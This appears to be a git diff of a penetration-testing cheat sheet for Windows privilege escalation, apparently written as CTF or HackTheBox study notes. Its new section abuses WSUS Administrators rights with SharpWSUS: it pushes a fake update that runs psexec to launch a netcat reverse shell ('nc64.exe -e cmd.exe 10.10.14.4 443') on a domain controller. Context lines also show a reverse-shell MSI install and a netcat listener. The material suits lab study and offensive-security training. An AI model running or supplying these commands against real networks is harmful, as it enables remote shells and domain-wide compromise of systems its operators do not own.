@@ -654,7 +654,7 @@ msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 
 Open an existing random project in Visual Studio 2022-> go to Extensions tab -> Manage extensions
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Install "Microsoft Visual Studio Installer Projects 2022" --> Restart VS to complete the installation
 
@@ -1414,5 +1414,25 @@ nc -lvp 443
 ```
 
 <figure><img src="../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+<details>
+
+<summary>WSUS Administrators</summary>
+
+Use [https://github.com/nettitude/SharpWSUS](https://github.com/nettitude/SharpWSUS)
+
+To provide updates to internal servers without direct internet connection
+
+Must use Microsoft signed binaries only!
+
+```
+.\SharpWSUS.exe create /payload:"C:\temp\psexec_64.exe" /args:" -accepteula -s -d c:\temp\nc64.exe -e cmd.exe 10.10.14.4 443" /title:"CVE-2022-30190"
+
+.\SharpWSUS.exe approve /updateid:<ID> /computername:dc.outdated.htb /groupname:"CriticalPatches"
+```
+
+<figure><img src="../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>
 
 </details>
